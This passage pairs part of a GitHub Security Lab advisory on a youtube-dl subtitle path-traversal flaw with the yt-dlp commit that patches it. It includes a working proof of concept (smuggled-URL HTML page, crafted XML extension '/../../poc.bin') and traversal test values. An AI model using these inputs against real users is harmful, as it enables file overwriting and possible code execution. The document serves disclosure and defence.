doesn‚Äôt accept paths like `not_existing_folder/../../file`. But it does work on Windows.

```
        if subtitles_are_requested and info_dict.get('requested_subtitles'):
            # subtitles download errors are already managed as troubles in relevant IE
            # that way it will silently go on when used with unsupporting IE
            subtitles = info_dict['requested_subtitles']
            ie = self.get_info_extractor(info_dict['extractor_key'])
            for sub_lang, sub_info in subtitles.items():
                sub_format = sub_info['ext']
                sub_filename = subtitles_filename(filename, sub_lang, sub_format, info_dict.get('ext')) # <------------- [1]
                if self.params.get('nooverwrites', False) and os.path.exists(encodeFilename(sub_filename)):
                    self.to_screen('[info] Video subtitle %s.%s is already present' % (sub_lang, sub_format))
                else:
                    self.to_screen('[info] Writing video subtitles to: ' + sub_filename)
                    if sub_info.get('data') is not None:
#...
                    else:
                        try:
                            sub_data = ie._request_webpage(
                                sub_info['url'], info_dict['id'], note=False).read()
                            with open(encodeFilename(sub_filename), 'wb') as subfile: # <------------- [2]
                                subfile.write(sub_data)
                        except (ExtractorError, IOError, OSError, ValueError) as err:
                            self.report_warning('Unable to download subtitle for "%s": %s' %
                                                (sub_lang, error_to_compat_str(err)))
                            continue

```
#### Exploitability and Proof of Concept (PoC)

Intentionally crafted subtitle extension names in a supported website (such as youtube.com or bbc.co.uk) are not in the threat model of the report. However it is possible that the websites may be compromised at some moment of time. An XSS or SQL injection would allow the attacker to exploit a specific youtube-dl extractor. Then the attacker would need to wait for any youtube-dl user or trick a specific youtube-dl user to download the video with subtitles. However other youtube-dl features allow exploitation without compromising the video hosting website:

1. URL smuggling. Some youtube-dl extractors attempt to get additional information from the URL part that comes after `#` - the fragment. The fragment is URL decoded and parsed as JSON. The extractor for Microsoft Virtual Academy, for example, parses the fragment [1] and retrieves `base_url` from it [2] and then downloads an XML file from that URL [3]. The subtitle extension is extracted from the XML file. If a user is tricked to run, for example, `youtube-dl --write-sub https://mva.microsoft.com/en-US/training-courses/microsoft-azure-fundamentals-virtual-machines-11788?l=gfVXISmEB_6804984382#__youtubedl_smuggle=%7B%22base_url%22%3A+%22http%3A%2F%2Fsite.com%22%7D` it will use an XML file from an attacker controlled site, `site.com` in this case, to extract subtitles and video files.
   ```
        url, smuggled_data = unsmuggle_url(url, {}) <------------- [1]

        mobj = re.match(self._VALID_URL, url)
        course_id = mobj.group('course_id')
        video_id = mobj.group('id')

        base_url = smuggled_data.get('base_url') or self._extract_base_url(course_id, video_id) <------------- [2]

        settings = self._download_xml(
            '%s/content/content_%s/videosettings.xml?v=1' % (base_url, video_id), <------------- [3]
            video_id, 'Downloading video settings XML')

   ```
2. Generic extractor. `youtube-dl` allows you to download videos from arbitrary pages that embed supported video websites. This allows the attacker to hide the smuggled fragment from a youtube-dl user. The user needs to run only `youtube-dl --write-sub https://attacker.com/poc.html`

For a PoC:

* Create a folder with the following `poc.html`:

```
<class="embedly-card" href="https://mva.microsoft.com/en-US/training-courses/microsoft-azure-fundamentals-virtual-machines-11788?l=gfVXISmEB_6804984382#__youtubedl_smuggle=%7B%22base_url%22%3A+%22http%3A%2F%2F127.0.0.1%3A8000%22%7D">

```

* Create two subfolders `content/content_gfVXISmEB_6804984382` in the folder where `poc.html` resides.
* Create the following `videosettings.xml` in the `content_gfVXISmEB_6804984382` folder:

```
<videoSettings version="1.5">
  <PlaylistItems>
    <PlaylistItem>
      <MediaSources videoType="progressive">Ôªø<MediaSource videoMode="720p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="true">http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_high.mp4</MediaSource>Ôªø<MediaSource videoMode="540p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="false">http://video.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01_mid.mp4</MediaSource>Ôªø<MediaSource videoMode="360p" mimeType="video/mp4" codec="avc1.42E01E,mp4a.40.2" default="false">https://sec.ch9.ms/ch9/1089/193d8990-f065-432e-87d7-981c61e41089/636AzureFundamentalsVM01.mp4</MediaSource></MediaSources>
      <MediaSource />
      <Title>01 | Introduction</Title>
      <MarkerResourceSource type="/../../poc.bin">content/content_gfvxismeb_6804984382/subtitles</MarkerResourceSource>
      <ThumbSource />
    </PlaylistItem>
  </PlaylistItems>
</videoSettings>

```

* Create arbitrary file `subtitles` in the `content_gfVXISmEB_6804984382` folder.
* Host the folder with `poc.html` with `python3 -m http.server`
* On Windows run `youtube-dl --write-sub http://127.0.0.1:8000/poc.html`
* `youtube-dl` creates a file `poc.bin` one level up from the current folder as long as the running user has sufficient permissions.

#### Impact

This issue may lead to unauthorized file system modification and later may lead to remote code execution if an executable file is overwritten.

## CVE

* CVE-2024-38519

## Credit

This issue was discovered and reported by GHSL team member [@JarLob (Jaroslav Lobaƒçevski)](https://github.com/JarLob).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-089` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ¬©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_7dab5a77_20250111_204603.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Fcommit%2F5ce582448ececb8d9c30c8c31f58330090ced03a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyt-dlp%2Fyt-dlp%2Fcommit%2F5ce582448ececb8d9c30c8c31f58330090ced03a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=yt-dlp%2Fyt-dlp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yt-dlp](/yt-dlp)
/
**[yt-dlp](/yt-dlp/yt-dlp)**
Public

* [Notifications](/login?return_to=%2Fyt-dlp%2Fyt-dlp) You must be signed in to change notification settings
* [Fork
  7.5k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)
* [Star
   96k](/login?return_to=%2Fyt-dlp%2Fyt-dlp)

* [Code](/yt-dlp/yt-dlp)
* [Issues
  1.5k](/yt-dlp/yt-dlp/issues)
* [Pull requests
  323](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects
  4](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

Additional navigation options

* [Code](/yt-dlp/yt-dlp)
* [Issues](/yt-dlp/yt-dlp/issues)
* [Pull requests](/yt-dlp/yt-dlp/pulls)
* [Discussions](/yt-dlp/yt-dlp/discussions)
* [Actions](/yt-dlp/yt-dlp/actions)
* [Projects](/yt-dlp/yt-dlp/projects)
* [Wiki](/yt-dlp/yt-dlp/wiki)
* [Security](/yt-dlp/yt-dlp/security)
* [Insights](/yt-dlp/yt-dlp/pulse)

## Commit

[Permalink](/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[core] Disallow unsafe extensions ([CVE-2024-38519](https://github.com/advisories/GHSA-79w7-vh3h-8g4j "CVE-2024-38519"))

[Browse files](/yt-dlp/yt-dlp/tree/5ce582448ececb8d9c30c8c31f58330090ced03a)
Browse the repository at this point in the history

```
Ref: [GHSA-79w7-vh3h-8g4j](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j "GHSA-79w7-vh3h-8g4j")

Authored by: Grub4K
```

* Loading branch information

[![@Grub4K](https://avatars.githubusercontent.com/u/37424085?s=40&v=4)](/Grub4K)

[Grub4K](/yt-dlp/yt-dlp/commits?author=Grub4K "View all commits by Grub4K")
committed
Jul 1, 2024

1 parent
[6aaf96a](/yt-dlp/yt-dlp/commit/6aaf96a3d6e7d0d426e97e11a2fcf52fda00e733)

commit 5ce5824

 Show file tree

 Hide file tree

Showing
**7 changed files**
with
**179 additions**
and
**12 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* README.md
  [README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5)
* devscripts

  + devscripts/changelog\_override.json
    [changelog\_override.json](#diff-323808d1d1a45be3d06ea051c76192878238cd5c25e74087fbdad00eab2c6a16)
* test

  + test/test\_utils.py
    [test\_utils.py](#diff-1780a2492dac55d0b4c5ff13cd3cf852a72cdac8995e17b10c87eeb678b3179e)
* yt\_dlp

  + yt\_dlp/YoutubeDL.py
    [YoutubeDL.py](#diff-d3ba8be45cae8dd7889a71c3360c9e4ac1160de8a5f3443b6e4a656395267f9b)
  + yt\_dlp/\_\_init\_\_.py
    [\_\_init\_\_.py](#diff-368601fd75cc1f1f9a4427938fe6381ffbab2ed89434cabb25d9346b43f037b0)
  + yt\_dlp/options.py
    [options.py](#diff-c2d761a809b2c0014b1f78cff8163e4fe99be9eb6b779663f8a521990b35688c)
  + utils

    - yt\_dlp/utils/\_utils.py
      [\_utils.py](#diff-feda8f56946dc048e754111850baaef0eec4b9f8bbc2d3f04b1a785626ea5c0e)

## There are no files selected for viewing

8 changes: 8 additions & 0 deletions

8
[README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5 "README.md")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/README.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -2229,6 +2229,14 @@ For ease of use, a few more compat options are available: |
|  |  | \* `--compat-options 2022`: Same as `--compat-options 2023,playlist-match-filter,no-external-downloader-progress,prefer-legacy-http-handler,manifest-filesize-approx` |
|  |  | \* `--compat-options 2023`: Currently does nothing. Use this to enable all future compat options |
|  |  |  |
|  |  | The following compat options restore vulnerable behavior from before security patches: |
|  |  |  |
|  |  | \* `--compat-options allow-unsafe-ext`: Allow files with any extension (including unsafe ones) to be downloaded ([GHSA-79w7-vh3h-8g4j](<https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j>)) |
|  |  |  |
|  |  | > :warning: Only use if a valid file download is rejected because its extension is detected as uncommon |
|  |  | > |
|  |  | > \*\*This option can enable remote code execution! Consider [opening an issue](<https://github.com/yt-dlp/yt-dlp/issues/new/choose>) instead!\*\* |
|  |  |  |
|  |  | ### Deprecated options |
|  |  |  |
|  |  | These are all the deprecated options and the current alternative to achieve the same effect |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[devscripts/changelog\_override.json](#diff-323808d1d1a45be3d06ea051c76192878238cd5c25e74087fbdad00eab2c6a16 "devscripts/changelog_override.json")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/devscripts/changelog_override.json)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -175,5 +175,10 @@ |
|  |  | "when": "e6a22834df1776ec4e486526f6df2bf53cb7e06f", |
|  |  | "short": "[ie/orf:on] Add `prefer\_segments\_playlist` extractor-arg (#10314)", |
|  |  | "authors": ["seproDev"] |
|  |  | }, |
|  |  | { |
|  |  | "action": "add", |
|  |  | "when": "6aaf96a3d6e7d0d426e97e11a2fcf52fda00e733", |
|  |  | "short": "[priority] Security: [[CVE-2024-10123](https://nvd.nist.gov/vuln/detail/CVE-2024-10123)] [Properly sanitize file-extension to prevent file system modification and RCE](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j)\n - Unsafe extensions are now blocked from being downloaded" |
|  |  | } |
|  |  | ] |

31 changes: 31 additions & 0 deletions

31
[test/test\_utils.py](#diff-1780a2492dac55d0b4c5ff13cd3cf852a72cdac8995e17b10c87eeb678b3179e "test/test_utils.py")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/test/test_utils.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -130,6 +130,7 @@ |
|  |  | xpath\_text, |
|  |  | xpath\_with\_ns, |
|  |  | ) |
|  |  | from yt\_dlp.utils.\_utils import \_UnsafeExtensionError |
|  |  | from yt\_dlp.utils.networking import ( |
|  |  | HTTPHeaderDict, |
|  |  | escape\_rfc3986, |
| Expand Down  Expand Up | | @@ -281,6 +282,13 @@ def env(var): |
|  |  | finally: |
|  |  | os.environ['HOME'] = old\_home or '' |
|  |  |  |
|  |  | \_uncommon\_extensions = [ |
|  |  | ('exe', 'abc.exe.ext'), |
|  |  | ('de', 'abc.de.ext'), |
|  |  | ('../.mp4', None), |
|  |  | ('..\\.mp4', None), |
|  |  | ] |
|  |  |  |
|  |  | def test\_prepend\_extension(self): |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'temp'), 'abc.temp.ext') |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'temp', 'ext'), 'abc.temp.ext') |
| Expand All | | @@ -289,6 +297,19 @@ def test\_prepend\_extension(self): |
|  |  | self.assertEqual(prepend\_extension('.abc', 'temp'), '.abc.temp') |
|  |  | self.assertEqual(prepend\_extension('.abc.ext', 'temp'), '.abc.temp.ext') |
|  |  |  |
|  |  | # Test uncommon extensions |
|  |  | self.assertEqual(prepend\_extension('abc.ext', 'bin'), 'abc.bin.ext') |
|  |  | for ext, result in self.\_uncommon\_extensions: |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | prepend\_extension('abc', ext) |
|  |  | if result: |
|  |  | self.assertEqual(prepend\_extension('abc.ext', ext, 'ext'), result) |
|  |  | else: |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | prepend\_extension('abc.ext', ext, 'ext') |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | prepend\_extension('abc.unexpected\_ext', ext, 'ext') |
|  |  |  |
|  |  | def test\_replace\_extension(self): |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'temp'), 'abc.temp') |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'temp', 'ext'), 'abc.temp') |
| Expand All | | @@ -297,6 +318,16 @@ def test\_replace\_extension(self): |
|  |  | self.assertEqual(replace\_extension('.abc', 'temp'), '.abc.temp') |
|  |  | self.assertEqual(replace\_extension('.abc.ext', 'temp'), '.abc.temp') |
|  |  |  |
|  |  | # Test uncommon extensions |
|  |  | self.assertEqual(replace\_extension('abc.ext', 'bin'), 'abc.unknown\_video') |
|  |  | for ext, \_ in self.\_uncommon\_extensions: |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | replace\_extension('abc', ext) |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | replace\_extension('abc.ext', ext, 'ext') |
|  |  | with self.assertRaises(\_UnsafeExtensionError): |
|  |  | replace\_extension('abc.unexpected\_ext', ext, 'ext') |
|  |  |  |
|  |  | def test\_subtitles\_filename(self): |
|  |  | self.assertEqual(subtitles\_filename('abc.ext', 'en', 'vtt'), 'abc.en.vtt') |
|  |  | self.assertEqual(subtitles\_filename('abc.ext', 'en', 'vtt', 'ext'), 'abc.en.vtt') |
| Expand Down | |  |

23 changes: 20 additions & 3 deletions

23
[yt\_dlp/YoutubeDL.py](#diff-d3ba8be45cae8dd7889a71c3360c9e4ac1160de8a5f3443b6e4a656395267f9b "yt_dlp/YoutubeDL.py")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/yt_dlp/YoutubeDL.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -159,7 +159,7 @@ |
|  |  | write\_json\_file, |
|  |  | write\_string, |
|  |  | ) |
|  |  | from .utils.\_utils import \_YDLLogger |
|  |  | from .utils.\_utils import \_UnsafeExtensionError, \_YDLLogger |
|  |  | from .utils.networking import ( |
|  |  | HTTPHeaderDict, |
|  |  | clean\_headers, |
| Expand All | | @@ -172,6 +172,20 @@ |
|  |  | import ctypes |
|  |  |  |
|  |  |  |
|  |  | def \_catch\_unsafe\_extension\_error(func): |
|  |  | @functools.wraps(func) |
|  |  | def wrapper(self, \*args, \*\*kwargs): |
|  |  | try: |
|  |  | return func(self, \*args, \*\*kwargs) |
|  |  | except \_UnsafeExtensionError as error: |
|  |  | self.report\_error( |
|  |  | f'The extracted extension ({error.extension!r}) is unusual ' |
|  |  | 'and will be skipped for safety reasons. ' |
|  |  | f'If you believe this is an error{bug\_reports\_message(",")}') |
|  |  |  |
|  |  | return wrapper |
|  |  |  |
|  |  |  |
|  |  | class YoutubeDL: |
|  |  | """YoutubeDL class. |
|  |  |  |
| Expand Down  Expand Up | | @@ -454,8 +468,9 @@ class YoutubeDL: |
|  |  | Set the value to 'native' to use the native downloader |
|  |  | compat\_opts: Compatibility options. See "Differences in default behavior". |
|  |  | The following options do not work when used through the API: |
|  |  | filename, abort-on-error, multistreams, no-live-chat, format-sort |
|  |  | no-clean-infojson, no-playlist-metafiles, no-keep-subs, no-attach-info-json. |
|  |  | filename, abort-on-error, multistreams, no-live-chat, |
|  |  | format-sort, no-clean-infojson, no-playlist-metafiles, |
|  |  | no-keep-subs, no-attach-info-json, allow-unsafe-ext. |
|  |  | Refer \_\_init\_\_.py for their implementation |
|  |  | progress\_template: Dictionary of templates for progress outputs. |
|  |  | Allowed keys are 'download', 'postprocess', |
| Expand Down  Expand Up | | @@ -1400,6 +1415,7 @@ def evaluate\_outtmpl(self, outtmpl, info\_dict, \*args, \*\*kwargs): |
|  |  | outtmpl, info\_dict = self.prepare\_outtmpl(outtmpl, info\_dict, \*args, \*\*kwargs) |
|  |  | return self.escape\_outtmpl(outtmpl) % info\_dict |
|  |  |  |
|  |  | @\_catch\_unsafe\_extension\_error |
|  |  | def \_prepare\_filename(self, info\_dict, \*, outtmpl=None, tmpl\_type=None): |
|  |  | assert None in (outtmpl, tmpl\_type), 'outtmpl and tmpl\_type are mutually exclusive' |
|  |  | if outtmpl is None: |
| Expand Down  Expand Up | | @@ -3192,6 +3208,7 @@ def existing\_file(self, filepaths, \*, default\_overwrite=True): |
|  |  | os.remove(file) |
|  |  | return None |
|  |  |  |
|  |  | @\_catch\_unsafe\_extension\_error |
|  |  | def process\_info(self, info\_dict): |
|  |  | """Process a single resolved IE result. (Modifies it in-place)""" |
|  |  |  |
| Expand Down | |  |

8 changes: 8 additions & 0 deletions

8
[yt\_dlp/\_\_init\_\_.py](#diff-368601fd75cc1f1f9a4427938fe6381ffbab2ed89434cabb25d9346b43f037b0 "yt_dlp/__init__.py")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/yt_dlp/__init__.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -64,6 +64,7 @@ |
|  |  | write\_string, |
|  |  | ) |
|  |  | from .utils.networking import std\_headers |
|  |  | from .utils.\_utils import \_UnsafeExtensionError |
|  |  | from .YoutubeDL import YoutubeDL |
|  |  |  |
|  |  | \_IN\_CLI = False |
| Expand Down  Expand Up | | @@ -593,6 +594,13 @@ def report\_deprecation(val, old, new=None): |
|  |  | if opts.ap\_username is not None and opts.ap\_password is None: |
|  |  | opts.ap\_password = getpass.getpass('Type TV provider account password and press [Return]: ') |
|  |  |  |
|  |  | # compat option changes global state destructively; only allow from cli |
|  |  | if 'allow-unsafe-ext' in opts.compat\_opts: |
|  |  | warnings.append( |
|  |  | 'Using allow-unsafe-ext opens you up to potential attacks. ' |
|  |  | 'Use with great care!') |
|  |  | \_UnsafeExtensionError.sanitize\_extension = lambda x: x |
|  |  |  |
|  |  | return warnings, deprecation\_warnings |
|  |  |  |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[yt\_dlp/options.py](#diff-c2d761a809b2c0014b1f78cff8163e4fe99be9eb6b779663f8a521990b35688c "yt_dlp/options.py")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/yt_dlp/options.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -474,7 +474,7 @@ def \_alias\_callback(option, opt\_str, value, parser, opts, nargs): |
|  |  | 'no-attach-info-json', 'embed-thumbnail-atomicparsley', 'no-external-downloader-progress', |
|  |  | 'embed-metadata', 'seperate-video-versions', 'no-clean-infojson', 'no-keep-subs', 'no-certifi', |
|  |  | 'no-youtube-channel-redirect', 'no-youtube-unavailable-videos', 'no-youtube-prefer-utc-upload-date', |
|  |  | 'prefer-legacy-http-handler', 'manifest-filesize-approx', |
|  |  | 'prefer-legacy-http-handler', 'manifest-filesize-approx', 'allow-unsafe-ext', |
|  |  | }, 'aliases': { |
|  |  | 'youtube-dl': ['all', '-multistreams', '-playlist-match-filter', '-manifest-filesize-approx'], |
|  |  | 'youtube-dlc': ['all', '-no-youtube-channel-redirect', '-no-live-chat', '-playlist-match-filter', '-manifest-filesize-approx'], |
| Expand Down | |  |

114 changes: 106 additions & 8 deletions

114
[yt\_dlp/utils/\_utils.py](#diff-feda8f56946dc048e754111850baaef0eec4b9f8bbc2d3f04b1a785626ea5c0e "yt_dlp/utils/_utils.py")

Show comments

[View file](/yt-dlp/yt-dlp/blob/5ce582448ececb8d9c30c8c31f58330090ced03a/yt_dlp/utils/_utils.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2085,17 +2085,20 @@ def parse\_duration(s): |
|  |  | (days, 86400), (hours, 3600), (mins, 60), (secs, 1), (ms, 1))) |
|  |  |  |
|  |  |  |
|  |  | def prepend\_extension(filename, ext, expected\_real\_ext=None): |
|  |  | def \_change\_extension(prepend, filename, ext, expected\_real\_ext=None): |
|  |  | name, real\_ext = os.path.splitext(filename) |
|  |  | return ( |
|  |  | f'{name}.{ext}{real\_ext}' |
|  |  | if not expected\_real\_ext or real\_ext[1:] == expected\_real\_ext |
|  |  | else f'{filename}.{ext}') |
|  |  |  |
|  |  | if not expected\_real\_ext or real\_ext[1:] == expected\_real\_ext: |
|  |  | filename = name |
|  |  | if prepend and real\_ext: |
|  |  | \_UnsafeExtensionError.sanitize\_extension(ext, prepend=True) |
|  |  | return f'{filename}.{ext}{real\_ext}' |
|  |  |  |
|  |  | return f'{filename}.{\_UnsafeExtensionError.sanitize\_extension(ext)}' |
|  |  |  |
|  |  | def replace\_extension(filename, ext, expected\_real\_ext=None): |
|  |  | name, real\_ext = os.path.splitext(filename) |
|  |  | return f'{name if not expected\_real\_ext or real\_ext[1:] == expected\_real\_ext else filename}.{ext}' |
|  |  |  |
|  |  | prepend\_extension = functools.partial(\_change\_extension, True) |
|  |  | replace\_extension = functools.partial(\_change\_extension, False) |
|  |  |  |
|  |  |  |
|  |  | def check\_executable(exe, args=[]): |
| Expand Down  Expand Up | | @@ -5035,6 +5038,101 @@ def items\_(self): |
|  |  | KNOWN\_EXTENSIONS = (\*MEDIA\_EXTENSIONS.video, \*MEDIA\_EXTENSIONS.audio, \*MEDIA\_EXTENSIONS.manifests) |
|  |  |  |
|  |  |  |
|  |  | class \_UnsafeExtensionError(Exception): |
|  |  | """ |
|  |  | Mitigation exception for uncommon/malicious file extensions |
|  |  | This should be caught in YoutubeDL.py alongside a warning |
|  |  |  |
|  |  | Ref: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j |
|  |  | """ |
|  |  | ALLOWED\_EXTENSIONS = frozenset([ |
|  |  | # internal |
|  |  | 'description', |
|  |  | 'json', |
|  |  | 'meta', |
|  |  | 'orig', |
|  |  | 'part', |
|  |  | 'temp', |
|  |  | 'uncut', |
|  |  | 'unknown\_video', |
